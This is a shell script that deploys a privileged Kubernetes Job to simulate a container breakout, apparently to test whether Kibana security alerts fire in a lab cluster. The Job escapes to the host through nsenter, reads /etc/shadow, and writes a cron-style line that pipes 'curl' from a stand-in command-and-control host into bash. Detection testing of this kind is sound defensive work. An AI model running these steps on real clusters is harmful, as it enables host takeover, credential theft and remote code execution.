#!/bin/bash -xe
# Simulate a container breakout to the host node via nsenter (node-level attack)

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

CONTROL_IP=$(terraform -chdir="${PROJECT_DIR}/infra" output -raw control_plane_public_ip)
KIBANA_URL=$(terraform -chdir="${PROJECT_DIR}/infra" output -raw kibana_url)
SSH_KEY="${PROJECT_DIR}/d4c2-key.pem"

# Create the container breakout simulation job
cat <<'JOBEOF' > /tmp/node-breakout-job.yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: node-breakout-sim
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      hostPID: true
      containers:
      - name: breakout
        image: ubuntu:22.04
        command: ["/bin/bash", "-c"]
        args:
          - |
            echo "=== Stage 1: Container escape via nsenter ==="
            # Break out of the container into the host's namespaces
            # nsenter --target 1 enters PID 1's (host init) namespace
            nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c '
              echo "=== Stage 2: Host reconnaissance ==="
              whoami
              hostname
              uname -a
              cat /etc/os-release
              ip addr show 2>/dev/null || ifconfig 2>/dev/null

              echo "=== Stage 3: Credential harvesting ==="
              cat /etc/shadow

              echo "=== Stage 4: Persistence ==="
              echo "* * * * * root curl -s http://evil.c2.server/beacon | bash" > /tmp/.hidden-cron
              echo "Backdoor cron installed at /tmp/.hidden-cron"
            '
            echo "Container breakout simulation complete"
            sleep 60
        securityContext:
          privileged: true
      restartPolicy: Never
  backoffLimit: 0
JOBEOF

# Delete previous run if exists
ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no ubuntu@${CONTROL_IP} \
  "kubectl delete job node-breakout-sim --ignore-not-found=true"

# Deploy the job
scp -i "$SSH_KEY" -o StrictHostKeyChecking=no \
  /tmp/node-breakout-job.yaml ubuntu@${CONTROL_IP}:/tmp/

ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no ubuntu@${CONTROL_IP} \
  "kubectl apply -f /tmp/node-breakout-job.yaml"

# Update shared state
jq '.demo_executed = true' "${PROJECT_DIR}/shared/env.json" > /tmp/env-updated.json \
  && mv /tmp/env-updated.json "${PROJECT_DIR}/shared/env.json"

echo ""
echo "====================================="
echo " Node breakout simulation deployed!"
echo "====================================="
echo ""
echo "Attack stages:"
echo "  1. Container escape via nsenter (hostPID + privileged)"
echo "  2. Host reconnaissance (whoami, hostname, uname)"
echo "  3. Credential harvesting (reads /etc/shadow)"
echo "  4. Persistence (fake cron backdoor on host)"
echo ""
echo "Check for alerts in Kibana:"
echo "  Security Alerts: ${KIBANA_URL}/app/security/alerts"
echo "  Security Events: ${KIBANA_URL}/app/security/events"
echo ""
echo "It may take 1-2 minutes for events to appear."
